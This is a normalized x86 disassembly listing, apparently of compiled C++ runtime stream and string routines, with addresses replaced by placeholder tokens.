retn 0x4
push [ ebp - 0x34 ]
call j_sub_417912#2
add esp 0x4
sub_40b990
push 0x8
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_41775f
add esp 0x4
test eax eax
je sub_4167fc
mov [ rw-data ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov eax [ rw-data ]
mov [ eax ] rw-data
mov eax rw-data
retn
sub_40ba00
cmp [ rw-data ] 0x0
je r-xdata
retn
mov ecx [ rw-data ]
mov eax [ rw-data ]
dec ecx
and ecx [ rw-data ]
push esi
mov esi [ eax + ecx * 4 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
dec [ rw-data ]
pop esi
jne r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
inc [ rw-data ]
mov [ rw-data ] 0x0
retn
sub_40ba60
push ebp
mov ebp esp
push 0xffffffff
push sub_430372
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea edi [ esi + 0x10 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push ecx
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
push edi
add ecx esi
call sub_40c9f0
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + esi - 0x4 ] eax
mov ecx edi
call sub_40da20
lea eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
lea eax [ edi + 0x14 ]
mov [ edi + 0x1c ] eax
lea eax [ edi + 0x18 ]
mov [ edi + 0x20 ] eax
lea eax [ edi + 0x24 ]
mov [ edi + 0x2c ] eax
mov [ edi ] r--data
mov [ edi + 0x4c ] 0x0
mov [ edi + 0x45 ] 0x0
lea ecx [ edi + 0x8 ]
mov [ edi + 0x10 ] ecx
lea eax [ edi + 0x28 ]
mov [ edi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ edi + 0x20 ]
mov [ eax ] 0x0
mov eax [ edi + 0x30 ]
mov [ eax ] 0x0
mov eax [ edi + 0xc ]
mov [ eax ] 0x0
mov eax [ edi + 0x1c ]
mov [ eax ] 0x0
mov eax [ edi + 0x2c ]
mov [ eax ] 0x0
mov eax [ rw-data ]
mov [ edi + 0x50 ] 0x0
mov [ edi + 0x48 ] eax
mov [ edi + 0x40 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push ecx
push 0x1
push eax
mov ecx edi
call sub_40d2e0
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_408e40
sub_40bbf0
push esi
mov esi ecx
cmp [ esi + 0x50 ] 0x0
mov [ esi ] r--data
je r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov edx [ esi + 0xc ]
lea eax [ esi + 0x44 ]
cmp [ edx ] eax
jne r-xdata
mov [ esi ] r--data
mov esi [ esi + 0x34 ]
test esi esi
je r-xdata
mov ecx esi
call sub_40d3a0
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x3c ]
mov [ edx ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi + 0x2c ]
sub ecx ecx
mov [ eax ] ecx
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
push esi
call j_sub_417912#2
add esp 0x4
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_40bc80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430958
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xffffffff
jne r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
mov esi [ ebx + 0x30 ]
mov edi [ esi ]
lea eax [ edi + edx ]
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebx + 0xc ]
lea eax [ ebx + 0x44 ]
cmp [ edx ] eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ edi - 0x1 ]
mov [ esi ] eax
mov ecx [ ebx + 0x20 ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov [ edx ] al
jmp r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx + 0x38 ]
mov ecx [ ebx + 0x3c ]
mov [ edx ] eax
mov eax [ ebx + 0x1c ]
mov [ eax ] ecx
mov eax [ ebx + 0x2c ]
sub ecx ecx
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ esp + 0x1f ] cl
mov ecx 0xf
mov [ esp + 0x20 ] 0x0
xorps xmm0 xmm0
movq [ esp + 0x20 ] xmm0
lea eax [ esp + 0x20 ]
cmp ecx 0x10
cmovae eax [ esp + 0x20 ]
mov [ esp + 0x34 ] ecx
mov [ esp + 0x30 ] 0x8
mov [ eax + 0x8 ] 0x0
mov [ esp + 0x48 ] 0x0
jmp r-xdata
push [ ebx + 0x50 ]
movsx eax cl
push eax
call sub_418e66
or ecx 0xffffffff
add esp 0x8
cmp eax ecx
cmovne ecx [ ebp + 0x8 ]
mov eax ecx
jmp r-xdata
cmp [ esp + 0x34 ] 0x10
mov esi [ ebx + 0x40 ]
lea eax [ esp + 0x14 ]
mov edi [ esi ]
push eax
mov eax [ esp + 0x34 ]
lea ecx [ esp + 0x24 ]
cmovae ecx [ esp + 0x24 ]
lea edx [ esp + 0x24 ]
cmovae edx [ esp + 0x24 ]
add eax ecx
push eax
push edx
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x33 ]
push eax
lea eax [ ebx + 0x48 ]
push eax
mov ecx esi
call [ edi + 0x1c ]
test eax eax
js r-xdata
or ebx 0xffffffff
cmp eax 0x1
jg r-xdata
mov eax ebx
push [ esp + 0x20 ]
call j_sub_417912#2
add esp 0x4
cmp eax 0x3
jne r-xdata
mov edi [ esp + 0x34 ]
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x14 ]
cmp edi 0x10
lea eax [ esp + 0x20 ]
cmovae eax ecx
sub esi eax
je r-xdata
movsx eax [ esp + 0x1f ]
push [ ebx + 0x50 ]
push eax
call sub_418e66
or ecx 0xffffffff
add esp 0x8
cmp eax ecx
cmovne ecx [ ebp + 0x8 ]
mov ebx ecx
jmp r-xdata
lea eax [ esp + 0x1f ]
mov [ ebx + 0x45 ] 0x1
cmp [ esp + 0x18 ] eax
jne r-xdata
push [ ebx + 0x50 ]
lea eax [ esp + 0x24 ]
push esi
cmp edi 0x10
cmovae eax ecx
push 0x1
push eax
call sub_417f55
add esp 0x10
cmp esi eax
jne r-xdata
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp [ esp + 0x30 ] 0x20
jae r-xdata
push esi
push 0x8
lea ecx [ esp + 0x28 ]
call sub_40c840
jmp r-xdata
sub_40beb0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax ] ecx
jae r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x2c ]
inc [ eax ]
mov eax [ esi + 0x1c ]
pop esi
dec [ eax ]
xor eax eax
cmp ebx 0xffffffff
cmovne eax ebx
pop ebx
pop ebp
retn 0x4
movzx eax [ ecx - 0x1 ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x1c ]
lea ecx [ esi + 0x44 ]
cmp [ eax ] ecx
je r-xdata
movzx ecx bl
push eax
push ecx
call sub_419047
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov [ ecx ] bl
mov ecx esi
call sub_40d730
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_40bf40
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x2c ]
mov eax [ eax ]
add eax ecx
cmp ecx eax
jae r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x10 ]
mov eax edi
pop edi
pop esi
retn
pop edi
or eax eax
pop esi
retn
movzx eax [ ecx ]
pop esi
retn
sub_40bf80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430958
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
mov edx [ ebx + 0x2c ]
mov esi [ edx ]
lea eax [ esi + ecx ]
cmp ecx eax
jae r-xdata
mov edx [ ebx + 0xc ]
lea eax [ ebx + 0x44 ]
cmp [ edx ] eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi - 0x1 ]
mov [ edx ] eax
mov ecx [ ebx + 0x1c ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
jmp r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx + 0x38 ]
mov ecx [ ebx + 0x3c ]
mov [ edx ] eax
mov eax [ ebx + 0x1c ]
mov [ eax ] ecx
mov eax [ ebx + 0x2c ]
sub ecx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
push [ ebx + 0x50 ]
call sub_418d6d
add esp 0x4
cmp eax 0xffffffff
je r-xdata
push [ ebx + 0x50 ]
call sub_418d6d
add esp 0x4
cmp eax 0xffffffff
je r-xdata
or esi 0xffffffff
push eax
push 0x1
lea ecx [ esp + 0x28 ]
call sub_40c840
cmp [ esp + 0x34 ] 0x10
mov ecx [ ebx + 0x40 ]
lea eax [ esp + 0x18 ]
mov edx [ ecx ]
push eax
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x27 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x40 ]
lea edi [ esp + 0x30 ]
cmovae edi [ esp + 0x30 ]
lea esi [ esp + 0x30 ]
cmovae esi [ esp + 0x30 ]
add eax edi
push eax
push esi
lea eax [ ebx + 0x48 ]
push eax
call [ edx + 0x18 ]
test eax eax
js r-xdata
movzx eax al
jmp r-xdata
mov eax esi
push [ esp + 0x20 ]
call j_sub_417912#2
add esp 0x4
cmp eax 0x1
jle r-xdata
lea eax [ esp + 0x1f ]
cmp [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ esp + 0x34 ] 0x10
lea esi [ esp + 0x20 ]
cmovae esi [ esp + 0x20 ]
sub esi eax
add esi [ esp + 0x30 ]
test esi esi
jle r-xdata
cmp [ esp + 0x34 ] 0x10
lea ecx [ esp + 0x20 ]
cmovae ecx [ esp + 0x20 ]
sub eax ecx
push eax
push 0x0
lea ecx [ esp + 0x28 ]
call sub_401730
cmp [ esp + 0x30 ] 0x1
jb r-xdata
movzx esi [ esp + 0x1f ]
jmp r-xdata
movsx eax [ esi + eax - 0x1 ]
push [ ebx + 0x50 ]
dec esi
push eax
call sub_419047
add esp 0x8
test esi esi
jle r-xdata
push [ ebx + 0x50 ]
call sub_418d6d
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x34 ] 0x10
lea eax [ esp + 0x20 ]
cmovae eax [ esp + 0x20 ]
push 0x1
push eax
lea eax [ esp + 0x27 ]
push 0x1
push eax
call sub_418c3b
add esp 0x10
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov eax [ esp + 0x14 ]
jmp r-xdata
sub_40c1a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi + 0x1c ]
lea ecx [ edi + 0x44 ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov eax [ r--data ]
mov [ esi ] eax
mov eax [ r--data ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov ecx edi
call sub_40d4f0
test al al
je r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
mov ecx [ esp + 0xc ]
mov eax ebx
or eax ecx
mov eax [ ebp + 0x14 ]
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
add ebx 0xffffffff
adc eax 0xffffffff
jmp r-xdata
push eax
push ecx
push ebx
push [ edi + 0x50 ]
call sub_41935e
add esp 0x10
test eax eax
jne r-xdata
cmp eax 0x1
je r-xdata
cmp [ edi + 0x50 ] 0x0
mov [ esp + 0xc ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ edi + 0x50 ]
call sub_419491
add esp 0x8
test eax eax
jne r-xdata
mov edx [ edi + 0xc ]
lea eax [ edi + 0x44 ]
cmp [ edx ] eax
jne r-xdata
mov edx [ edi + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edx
jmp r-xdata
mov eax [ edi + 0x38 ]
mov ecx [ edi + 0x3c ]
mov [ edx ] eax
mov eax [ edi + 0x1c ]
mov [ eax ] ecx
mov eax [ edi + 0x2c ]
sub ecx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x1c ]
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x14
sub_40c2c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi ecx
mov [ esp + 0x14 ] eax
cmp [ edi + 0x50 ] 0x0
mov eax [ ebp + 0x10 ]
mov [ esp + 0xc ] eax
je r-xdata
mov eax [ r--data ]
mov [ esi ] eax
mov eax [ r--data ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
call sub_40d4f0
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ edi + 0x50 ]
call sub_4194e6
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov eax ebx
or eax ecx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ edi + 0x50 ]
call sub_419491
add esp 0x8
test eax eax
jne r-xdata
push 0x1
push ecx
push ebx
push [ edi + 0x50 ]
call sub_41935e
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx edi
mov [ edi + 0x48 ] eax
call sub_40d700
mov edx [ edi + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edx
jmp r-xdata
mov ecx [ esp + 0x1c ]
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x20
sub_40c3c0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x50 ]
test ecx ecx
je r-xdata
xor eax eax
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
jne r-xdata
push 0x1
push [ esi + 0x50 ]
mov ecx esi
call sub_40d450
mov eax esi
pop esi
pop ebp
retn 0xc
lea eax [ edx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
push edx
push ecx
call sub_41951f
add esp 0x10
test eax eax
jne r-xdata
sub_40c410
push esi
mov esi ecx
cmp [ esi + 0x50 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x50 ]
call sub_4196d8
add esp 0x4
test eax eax
jns r-xdata
or eax 0xffffffff
pop esi
retn
sub_40c440
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40e930
add esp 0x4
mov ecx esi
push eax
call sub_40d670
pop esi
pop ebp
retn 0x4
sub_40c460
push ebp
mov ebp esp
push 0xffffffff
push sub_4303c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x60 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea edi [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push ecx
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
push edi
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40c9f0
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x60 ]
mov [ ecx + esi - 0x4 ] eax
mov ecx edi
call sub_40da20
lea eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
lea eax [ edi + 0x14 ]
mov [ edi + 0x1c ] eax
lea eax [ edi + 0x18 ]
mov [ edi + 0x20 ] eax
lea eax [ edi + 0x24 ]
mov [ edi + 0x2c ] eax
mov [ edi ] r--data
mov [ edi + 0x4c ] 0x0
mov [ edi + 0x45 ] 0x0
lea ecx [ edi + 0x8 ]
mov [ edi + 0x10 ] ecx
lea eax [ edi + 0x28 ]
mov [ edi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ edi + 0x20 ]
mov [ eax ] 0x0
mov eax [ edi + 0x30 ]
mov [ eax ] 0x0
mov eax [ edi + 0xc ]
mov [ eax ] 0x0
mov eax [ edi + 0x1c ]
mov [ eax ] 0x0
mov eax [ edi + 0x2c ]
mov [ eax ] 0x0
mov eax [ rw-data ]
mov [ edi + 0x50 ] 0x0
mov [ edi + 0x48 ] eax
mov [ edi + 0x40 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push ecx
push 0x2
push eax
mov ecx edi
call sub_40d2e0
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_408e40
sub_40c5e0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov eax [ esi ]
lea edx [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
push edx
mov [ eax + edx - 0x8 ] r--data
mov eax [ edx - 0x8 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0xc ] eax
mov [ edx ] r--data
call sub_416ed8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_40c630
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov eax [ esi ]
lea edx [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
push edx
mov [ eax + edx - 0x18 ] r--data
mov eax [ edx - 0x18 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x1c ] eax
mov [ edx ] r--data
call sub_416ed8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_40c680
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi [ esi + 0x34 ]
mov [ esi ] r--data
test edi edi
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
push edi
call j_sub_417912#2
add esp 0x4
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_40c6d0
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x70 ]
mov eax [ edi ]
lea esi [ edi + 0x70 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + esi - 0x74 ] eax
lea ecx [ esi - 0x60 ]
call sub_40bbf0
mov eax [ esi - 0x70 ]
push esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x74 ] eax
mov [ esi ] r--data
call sub_416ed8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_417912#2
add esp 0x4
sub_40c740
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40bbf0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
add esp 0x4
sub_40c770
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x60 ]
mov eax [ edi ]
lea esi [ edi + 0x60 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x60 ] r--data
mov eax [ esi - 0x60 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x60 ]
mov [ ecx + esi - 0x64 ] eax
lea ecx [ esi - 0x5c ]
call sub_40bbf0
mov eax [ esi - 0x60 ]
push esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x60 ] r--data
mov eax [ esi - 0x60 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x64 ] eax
mov [ esi ] r--data
call sub_416ed8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_417912#2
add esp 0x4
sub_40c7e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x10
mov edi ecx
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
pop edi
mov [ esi ] 0x0
pop esi
pop ebp
retn 0x4
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40c840
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_41682d
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + ebx ]
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
push ecx
push edi
mov ecx esi
call sub_4018d0
test edi edi
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_40d940
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40c8f0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x10 ]
cmp edx edi
jae r-xdata
cmp edx [ ecx + 0x10 ]
ja r-xdata
pop edi
pop ebx
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0xc
sub edi edx
cmp esi edi
ja r-xdata
mov eax edx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
movsx eax [ eax ]
push eax
push ecx
call sub_418cc0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
lea ecx [ eax + edx ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov edx ebx
sub ecx 0x4
jb r-xdata
sub ebx eax
pop edi
mov eax ebx
pop ebx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax ]
cmp ecx 0xfffffffc
je r-xdata
mov eax [ edx ]
cmp eax [ esi ]
jne r-xdata
mov al [ edx ]
cmp al [ esi ]
jne r-xdata
add edx 0x4
add esi 0x4
sub ecx 0x4
jae r-xdata
